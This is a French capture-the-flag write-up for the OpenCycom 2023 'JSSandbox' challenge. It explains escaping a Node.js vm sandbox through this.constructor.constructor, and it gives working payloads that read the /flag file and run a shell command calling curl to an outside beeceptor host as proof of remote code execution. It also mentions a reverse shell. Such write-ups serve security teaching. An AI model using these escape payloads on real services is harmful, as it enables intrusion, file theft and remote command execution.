---
title: "JSSandbox"
date: 2023-06-13T09:03:20-08:00
draft: false
---

# OpenCycom 2023 - JSSandbox - *300 pts*

## Énoncé
J'ai codé un super outil pour que les débutants puissent apprendre à utiliser NodeJS facilement sur Internet, en plus j'ai sandboxé l'exécution pour pas que des petits filous essayent de faire n'importe quoi :)

Je doute quand même de la robustesse de la méthode que j'ai employée, tu peux y jeter un coup d'oeil ?

*le flag se trouve dans le fichier* `/flag`

*Ce challenge a été résolu par 8,3% des équipes.*

## Solution

Une sandbox JavaScript ! Elle me permet de jouer avec JS et d'apprendre à programmer.

La première question que je me pose est : qui ou quoi exécute mon code ? Dans ce cas précis, ça a l'air d'être le serveur qui fait tout, car rien n'est exécuté côté client. Cela veut dire que le serveur exécute le code que je veux, pas mal non ?

![](/images/015/01.png)

Sauf qu'après quelques essais, on se rend compte que cette sandbox est bien limitée : pas d'accès aux modules `fs` ou `child_process`, et surtout, pas possible de `require` des nouveaux modules.

Cela ressemble a une VM JavaScript faite avec le module node `vm`, mais c'est plutôt une bonne nouvelle pour nous, car ce module n'est pas sécurisé du tout.

Commençons par essayer de trouver si un contexte existe avec le keyword `this`.

![](/images/015/02.png)

On nous retourne `[Object object]`, ce qui veut dire que `this` existe bel et bien.

Après quelques recherches sur Internet, je me rends compte qu'il serait possible de sortir du contexte de la VM en utilisant les constructeurs de mon objet `this` : `this.constructor.constructor`. Cela veut dire qu'on peut lui passer une fonction anonyme sous forme de texte, qui sera automatiquement appelée par le constructeur lors de son instanciation. 

Par exemple, on peut faire : `this.constructor.constructor('return 1+1')`

![](/images/015/03.png)

Bingo, on arrive à exécuter du code. Mais ça nous avance à quoi ?
Ce qui compte ici c'est le contexte dans lequel est exécuté notre code. En utilisant les constructeurs, on est en mesure d'échapper le contexte de la VM pour se retrouver dans le contexte global.

On peut maintenant utiliser `require` pour appeler n'importe quelle librairie native ! À nous le flag.

```
this.constructor.constructor("return process.mainModule.require(\'fs\').readFileSync(\'flag\',\'utf-8\')")()
```

![](/images/015/04.png)

Petit bonus, on peut également obtenir une RCE côté système avec le module `child_process`.

```
this.constructor.constructor("return process.mainModule.require(\'child_process\').exec(\'curl http://opencycom.free.beeceptor.com\')")()
```

![](/images/015/05.png)

![](/images/015/06.png)

À partir de là, il est trivial d'obtenir un reverse shell :)

*FLAG : OPC{VM\*\*\*\*\*\*\*\*\*\*}*
